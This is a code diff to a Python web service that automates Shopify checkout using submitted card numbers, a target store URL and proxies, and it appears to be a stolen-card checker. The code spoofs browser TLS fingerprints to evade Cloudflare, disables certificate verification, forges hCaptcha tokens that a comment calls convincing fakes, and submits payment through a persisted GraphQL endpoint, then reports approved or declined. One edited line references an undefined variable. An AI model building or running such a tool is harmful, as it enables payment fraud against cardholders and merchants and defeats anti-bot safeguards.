@@ -29,11 +29,9 @@ def safe_response(msg, raw_data, price, gate="Shopify Payments"):
     return {"Response": final_msg, "Price": clean_price, "Gate": gate}
 
 def generate_short_token():
-    # توليد الجزء العشوائي من الـ attemptToken بناءً على تحليلك
     return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
 
 def generate_page_id():
-    # توليد PageID بنفس صيغة شوبي فاي
     return str(uuid.uuid4()).upper()
 
 @app.get("/code/index.php")
@@ -64,7 +62,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": address1, "city": "New York", "province": "NY", "zip": "10024", "country": "US", "phone": phone
         }
 
-        # استخدام curl_cffi لتخطي الـ TLS وحماية Cloudflare بسرعة
         with requests.Session(impersonate="chrome120") as session:
             session.verify = False
 
@@ -145,8 +142,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers, proxies=proxies)
             queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
 
-            # استخراج بوابة الدفع وطريقة الشحن
-            gateway_id = "cad649605672ab70f23f8c528db5e8ae" # افتراضي من البايلود بتاعك
+            gateway_id = "cad649605672ab70f23f8c528db5e8ae"
             delivery_handle = "any"
             del_amt_constraint = {"any": True}
             try:
@@ -157,7 +153,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     if pm.get('paymentMethodIdentifier'):
                         gateway_id = pm.get('paymentMethodIdentifier')
                         if pm.get('name') == 'shopify_payments': break
-                        
                 d_lines = seller_prop.get('delivery', {}).get('deliveryLines', [])
                 if d_lines and d_lines[0].get('selectedDeliveryStrategy'):
                     delivery_handle = d_lines[0]['selectedDeliveryStrategy'].get('handle', 'any')
@@ -165,12 +160,12 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     if d_amt: del_amt_constraint = {"value": {"amount": d_amt['amount'], "currencyCode": d_amt['currencyCode']}}
             except: pass
 
-            # 5. تقديم الدفع النهائي (بصمات الهاكرز المدمجة)
-            sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
-            sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}...on SubmitRejected{__typename errors{code localizedMessage}}...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}}}"""
+            # 5. 🔥 الضربة القاضية: إرسال الطلب بالـ ID المخفي (بدون الـ Query الطويل)
+            # لاحظ الرابط اتغير لـ /persisted
+            sub_url = f"{store_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
             
             sub_vars = {
-                "attemptToken": f"{checkout_token}-{generate_short_token()}", # 🔥 تصحيح الـ attemptToken
+                "attemptToken": f"{checkout_token}-{generate_short_token()}", 
                 "input": {
                     "sessionInput": {"sessionToken": session_token}, 
                     "queueToken": queue_token, 
@@ -180,21 +175,22 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     "taxes": {"proposedTotalAmount": {"any": True}},
                     "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": gateway_id, "sessionId": card_session_id, "billingAddress": {"streetAddress": flat_address}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": flat_address}},
                     "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [{"email": {"consentState": "DECLINED", "value": buyer["email"]}}], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False},
-                    
-                    # 🔥 حقن البصمات الأمنية (Analytics & Mock Captcha)
-                    "analytics": {
-                        "requestUrl": final_url,
-                        "pageId": generate_page_id()
-                    },
                     "captcha": {
                         "provider": "hcaptcha",
                         "challenge": "comparison_challenge_type",
-                        "token": f"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{generate_short_token()}_{generate_page_id()}" # توكن وهمي مُقنع
+                        "token": f"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{generate_short_token()}_{generate_page_id()}"
                     }
                 }
             }
             
-            res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers, proxies=proxies)
+            # ده البايلود الجديد الخفيف اللي المتصفح بيبعته
+            sub_payload = {
+                "id": "48ab22a1f2e1aed3aad818910358bd0463e01d34e78d5b204b852781eaaa4e8f",
+                "operationName": "SubmitForCompletion",
+                "variables": sub_vars
+            }
+            
+            res_sub = session.post(sub_url, json=sub_payload, headers=gql_headers, proxies=proxies)
             sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
             sub_typename = sub_data.get('__typename') if sub_data else None
             
@@ -204,7 +200,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 return JSONResponse(content=safe_response(f"Shopify Rejected: {msg}", res_sub.text[:100], price))
             
             if sub_typename == 'SubmitFailed':
-                # لو رجع هنا، يبقى شوبي فاي قفش التوكن الوهمي ومفيش حل غير إضافة خدمة حل كابتشا مدفوعة
                 return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed Detected", price))
 
             receipt_id = sub_data.get('receipt', {}).get('id')
@@ -218,7 +213,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
             
             for _ in range(6):
-                res_poll = session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers, proxies=proxies)
+                res_poll = session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": sessionToken}}, headers=gql_headers, proxies=proxies)
                 p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                 if p_type == 'ProcessedReceipt': 
                     return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
